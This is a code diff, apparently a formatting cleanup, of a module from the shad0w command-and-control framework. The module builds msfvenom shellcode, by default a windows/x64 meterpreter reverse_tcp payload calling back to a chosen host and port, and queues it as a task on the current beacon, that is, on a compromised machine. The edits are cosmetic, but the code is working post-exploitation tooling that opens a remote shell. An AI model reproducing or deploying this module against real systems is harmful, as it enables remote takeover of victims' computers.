@@ -12,19 +12,19 @@ __type__ = "module"
 
 EXEC_ID = 0x3000
 
+
 class DummyClass(object):
     def __init__(self):
         pass
 
-# Let argparse error and exit nice
+
 def error(message):
-    #global ERROR, error_list
-    #ERROR = True
     print(f"\033[0;31m{message}\033[0m\n")
 
+
 def exit(status=0, message=None):
-    if message != None: print(message)
-    return
+    if message is not None:
+        print(message)
 
 
 def msfvenom_payload_gen(shad0w, payload, lport, lhost, arch):
@@ -66,7 +66,7 @@ def main(shad0w, args):
     # Setup the args, set default='' to show help message when missing
     parser.add_argument("--port", required=True, help="Port you would like Metasploit to call")
     parser.add_argument("--host", required=True, help="Host/IP you would like Metasploit to call")
-    parser.add_argument("--payload", help="What Metasploit payload you would like to deploy, default: windows/x64/meterpreter/reverse_tcp",required=False, default="windows/x64/meterpreter/reverse_tcp")
+    parser.add_argument("--payload", help="What Metasploit payload you would like to deploy, default: windows/x64/meterpreter/reverse_tcp", required=False, default="windows/x64/meterpreter/reverse_tcp")
 
     # Make sure we don't die from weird args
     try:
@@ -85,7 +85,7 @@ def main(shad0w, args):
         return
 
     # Generate and read the msfvenom shellcode
-    rcode = msfvenom_payload_gen(shad0w, payload = args.payload, lport = args.port, lhost = args.host, arch="x64")
+    rcode = msfvenom_payload_gen(shad0w, payload=args.payload, lport=args.port, lhost=args.host, arch="x64")
 
     # Set a task for the current beacon to do
     shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
